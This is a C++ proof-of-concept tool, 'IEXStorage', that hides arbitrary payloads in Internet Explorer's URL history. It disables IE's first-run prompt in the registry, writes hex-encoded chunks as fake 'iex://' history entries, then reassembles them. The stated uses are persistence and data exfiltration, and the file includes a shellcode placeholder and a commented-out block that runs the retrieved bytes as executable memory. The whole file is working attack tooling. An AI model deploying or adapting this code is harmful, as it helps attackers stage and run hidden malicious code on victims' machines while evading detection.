/**
 * IEXStorage - Internet Explorer Storage using URL History
 * Basically you can store anything in the URL history of Internet Explorer
 * could be used as persistence method, data exfiltration, etc.
 * 
 * @Author: Mauricio Jara - @synawk
 * 
*/
#define NOMINMAX

#include <Windows.h>
#include <urlhist.h>
#include <shlguid.h>
#include <iostream>
#include <string>
#include <sstream>
#include <iomanip>
#include <vector>
#include <algorithm>
#include <cstring>
#include <cwchar>
#include <cstdlib>
#include <utility>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "ole32.lib")

constexpr wchar_t ie_registry[] = L"Software\\Microsoft\\Internet Explorer\\Main";
constexpr size_t MAX_URL_PAYLOAD_LEN = 2000;

void DisableIEFirstRunPrompt()
{
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, ie_registry,
        0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS)
    {
        DWORD value = 1;
        RegSetValueExW(hKey, L"DisableFirstRunCustomize", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
        std::wcout << L"[+] IE First Run Prompt disabled via registry." << std::endl;
    }
    else
    {
        std::wcerr << L"[-] Failed to set registry key." << std::endl;
    }
}

void LaunchInternetExplorerInstance()
{
    IWebBrowser2* pIE = nullptr;
    HRESULT hr = CoCreateInstance(CLSID_InternetExplorer, NULL, CLSCTX_LOCAL_SERVER,
        IID_IWebBrowser2, (void**)&pIE);
    if (SUCCEEDED(hr) && pIE)
    {
        VARIANT empty;
        VariantInit(&empty);

        BSTR aboutBlank = SysAllocString(L"about:blank");
        hr = pIE->Navigate(aboutBlank, &empty, &empty, &empty, &empty);
        if (SUCCEEDED(hr))
        {
            std::wcout << L"[+] IE instance launched with about:blank." << std::endl;
        }

        // Wait briefly for internal components to initialize
        Sleep(5000);

        pIE->Quit();
        pIE->Release();
        SysFreeString(aboutBlank);
    }
    else
    {
        std::wcerr << L"[-] Failed to launch IE via. HRESULT: " << std::hex << hr << std::endl;
    }
}

void AddURLToHistory(IUrlHistoryStg2* pHistory, const wchar_t* url, const wchar_t* title)
{
    HRESULT hr = pHistory->AddUrl(url, title, ADDURL_ADDTOHISTORYANDCACHE);
    if (SUCCEEDED(hr))
    {
        std::wcout << L"[+] URL added to IE history: " << url << std::endl;
    }
    else
    {
        std::wcerr << L"[-] Failed to add URL. HRESULT: " << std::hex << hr << std::endl;
    }
}

void ListHistory(const wchar_t* key)
{

    HRESULT hrCo = CoInitialize(NULL);
    if (FAILED(hrCo))
    {
        std::cerr << "[-] CoInitialize failed." << std::endl;
        return;
    }

    IUrlHistoryStg2* pHistory = nullptr;
    hrCo = CoCreateInstance(CLSID_CUrlHistory, NULL, CLSCTX_INPROC_SERVER,
        IID_IUrlHistoryStg2, reinterpret_cast<void**>(&pHistory));
    if (FAILED(hrCo))
    {
        std::cerr << "[-] Failed to get IUrlHistoryStg2 interface." << std::endl;
        CoUninitialize();
        return;
    }

    IEnumSTATURL* pEnum = nullptr;
    HRESULT hr = pHistory->EnumUrls(&pEnum);
    if (SUCCEEDED(hr))
    {
        std::wcout << L"\n[+] Listing IE History:\n"
            << std::endl;
        STATURL staturl;
        ULONG fetched;
        while (pEnum->Next(1, &staturl, &fetched) == S_OK)
        {   
			//check if the title contains the key
			if (staturl.pwcsTitle && wcsncmp(staturl.pwcsTitle, key, wcslen(key)) == 0)
			{
				std::wcout << L"URL   : " << staturl.pwcsUrl << std::endl;
				std::wcout << L"Title : " << staturl.pwcsTitle << std::endl;
				std::wcout << L"---" << std::endl;
			}

            CoTaskMemFree(staturl.pwcsUrl);
            CoTaskMemFree(staturl.pwcsTitle);
        }
        pEnum->Release();
    }
    else
    {
        std::wcerr << L"[-] Failed to enumerate IE history. HRESULT: " << std::hex << hr << std::endl;
    }
}

unsigned char* GetPayloadFromHistory(const wchar_t* baseKey, size_t& out_len)
{
    DisableIEFirstRunPrompt();
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr))
        return nullptr;

    IUrlHistoryStg2* pHistory = nullptr;
    hr = CoCreateInstance(CLSID_CUrlHistory, NULL, CLSCTX_INPROC_SERVER,
        IID_IUrlHistoryStg2, reinterpret_cast<void**>(&pHistory));
    if (FAILED(hr))
    {
        CoUninitialize();
        return nullptr;
    }

    std::vector<std::pair<int, std::wstring>> chunks;

    IEnumSTATURL* pEnum = nullptr;
    hr = pHistory->EnumUrls(&pEnum);
    if (SUCCEEDED(hr))
    {
        STATURL staturl;
        ULONG fetched;

        while (pEnum->Next(1, &staturl, &fetched) == S_OK)
        {
            if (staturl.pwcsTitle && wcsncmp(staturl.pwcsTitle, baseKey, wcslen(baseKey)) == 0)
            {
                std::wstring title(staturl.pwcsTitle);
                size_t hashPos = title.find(L"#");
                if (hashPos != std::wstring::npos)
                {
                    try
                    {
                        int seq = std::stoi(title.substr(hashPos + 1));
                        if (staturl.pwcsUrl)
                        {
                            chunks.emplace_back(seq, std::wstring(staturl.pwcsUrl));
                        }
                    }
                    catch (...)
                    {
                    }
                }
            }

            if (staturl.pwcsUrl)
                CoTaskMemFree(staturl.pwcsUrl);
            if (staturl.pwcsTitle)
                CoTaskMemFree(staturl.pwcsTitle);
        }

        pEnum->Release();
    }

    pHistory->Release();
    CoUninitialize();

    std::sort(chunks.begin(), chunks.end(), [](const auto& a, const auto& b)
        { return a.first < b.first; });

    std::vector<unsigned char> result;
    for (const auto& [seq, url] : chunks)
    {
        size_t proto = url.find(L"://");
        if (proto == std::wstring::npos)
            continue;

        std::wstring hex = url.substr(proto + 3);
        if (!hex.empty() && !iswxdigit(hex.back()))
            hex.pop_back();

        if (hex.length() % 2 != 0)
            continue;

        for (size_t i = 0; i < hex.length(); i += 2)
        {
            std::wstring byteStr = hex.substr(i, 2);
            try
            {
                unsigned char byte = static_cast<unsigned char>(std::stoi(byteStr, nullptr, 16));
                result.push_back(byte);
            }
            catch (...)
            {
            }
        }
    }

    if (result.empty())
    {
        out_len = 0;
        return nullptr;
    }

    // Allocate and copy to raw buffer
    out_len = result.size();
    unsigned char* buffer = new unsigned char[out_len];
    std::copy(result.begin(), result.end(), buffer);
    return buffer;
}

HRESULT IEXStorage(const wchar_t* baseKey, const char* payload, size_t payload_len)
{
    DisableIEFirstRunPrompt();
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr))
        return hr;

    LaunchInternetExplorerInstance();

    IUrlHistoryStg2* pHistory = nullptr;
    hr = CoCreateInstance(CLSID_CUrlHistory, NULL, CLSCTX_INPROC_SERVER,
        IID_IUrlHistoryStg2, reinterpret_cast<void**>(&pHistory));
    if (FAILED(hr))
    {
        CoUninitialize();
        return hr;
    }

    IEnumSTATURL* pEnum = nullptr;
    if (SUCCEEDED(pHistory->EnumUrls(&pEnum)))
    {
        STATURL staturl;
        ULONG fetched;
        while (pEnum->Next(1, &staturl, &fetched) == S_OK)
        {
            if (staturl.pwcsTitle && wcsncmp(staturl.pwcsTitle, baseKey, wcslen(baseKey)) == 0)
            {
                std::wstring title(staturl.pwcsTitle);
                if (title.find(L"#") != std::wstring::npos)
                {
                    pHistory->DeleteUrl(staturl.pwcsUrl, 0);
                }
            }
            if (staturl.pwcsUrl)
                CoTaskMemFree(staturl.pwcsUrl);
            if (staturl.pwcsTitle)
                CoTaskMemFree(staturl.pwcsTitle);
        }
        pEnum->Release();
    }

    size_t chunk_size = MAX_URL_PAYLOAD_LEN / 2;
    size_t total_chunks = (payload_len + chunk_size - 1) / chunk_size;

    for (size_t i = 0; i < total_chunks; ++i)
    {
        std::wostringstream oss;
        oss << L"iex://";
        size_t start = i * chunk_size;
        size_t end = std::min(start + chunk_size, payload_len);
        for (size_t j = start; j < end; ++j)
        {
            oss << std::setw(2) << std::setfill(L'0') << std::hex
                << static_cast<unsigned int>(static_cast<unsigned char>(payload[j]));
        }
        oss << L"/";

        std::wstring url = oss.str();

        std::wostringstream keyStream;
        keyStream << baseKey << L"#" << std::setw(3) << std::setfill(L'0') << i;

        AddURLToHistory(pHistory, url.c_str(), keyStream.str().c_str());
    }

    pHistory->Release();
    CoUninitialize();
    return S_OK;
}

int main()
{

    const wchar_t* key = L"iexstorage"; //this could be anything you want

    const char data[] = { 0x90, 0x90, 0x90};//replace this with your shellcode
    HRESULT hr = IEXStorage(key, data, sizeof(data));
    if (FAILED(hr))
    {
        std::cerr << "[-] Failed to store payload in IE history." << std::endl;
        return 1;
    }

    // now list
    ListHistory(key);

    size_t payload_len = 0;
    unsigned char* payload = GetPayloadFromHistory(key, payload_len);
    if (payload && payload_len > 0)
    {
		std::cout << "[+] Retrieved payload from IE history: " << payload_len << " bytes." << std::endl;
        // using winapi launch the shellcode
        /*
        //uncomment this code to execute the shellcode
        void* exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (exec_mem) {
            memcpy(exec_mem, payload, payload_len);
            ((void(*)())exec_mem)();
            VirtualFree(exec_mem, 0, MEM_RELEASE);
        }

        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, NULL, 0, NULL);*/
        delete[] payload;
    }
    else
    {
        std::cerr << "[-] Failed to retrieve payload." << std::endl;
    }

    return 0;
}
